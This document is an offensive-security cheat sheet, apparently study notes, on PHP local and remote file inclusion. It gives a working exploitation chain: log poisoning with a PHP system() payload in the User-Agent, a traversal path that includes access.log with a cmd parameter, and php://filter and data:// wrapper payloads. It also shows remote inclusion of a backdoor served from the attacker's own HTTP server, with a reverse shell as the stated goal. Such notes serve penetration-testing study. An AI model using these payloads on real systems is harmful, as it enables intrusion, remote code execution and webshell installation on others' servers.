# LFI / RFI

File inclusion **executes** the included file; directory traversal only reads it.

## Local File Inclusion (LFI)

**Common exploitation chain:**
1. Poison Apache access logs by injecting PHP in the User-Agent
2. Include the log file via LFI to execute the injected code
3. Use the resulting webshell to get a reverse shell

**Log poisoning request:**
```http
GET /meteor/index.php HTTP/1.1
User-Agent: <?php echo system($_GET['cmd']); ?>
```

**LFI with cmd parameter:**
```
/meteor/index.php?page=../../../var/log/apache2/access.log&cmd=ls
```

**PHP Wrappers:**

| Wrapper | Use |
|---|---|
| `php://filter` | Read PHP source without executing (supports base64/rot13 encoding) |
| `php://data` | Embed inline data/code (`allow_url_include` must be enabled) |

```
# Read PHP file base64 encoded
php://filter/convert.base64-encode/resource=admin.php

# Execute inline base64 payload via data://
data://text/plain;base64,<BASE64_PAYLOAD>

# URL-encoded inline execution
data://text/plain,<?php+echo+system('ls');+?>
```

---

## Remote File Inclusion (RFI)

Requires `allow_url_include = On` in PHP config (disabled by default).

```bash
# 1. Host a webshell
cd /usr/share/webshells/php/
python3 -m http.server 9001

# 2. Trigger RFI
/path/to/page?page=http://<our-ip>/simple-backdoor.php&cmd=id
```
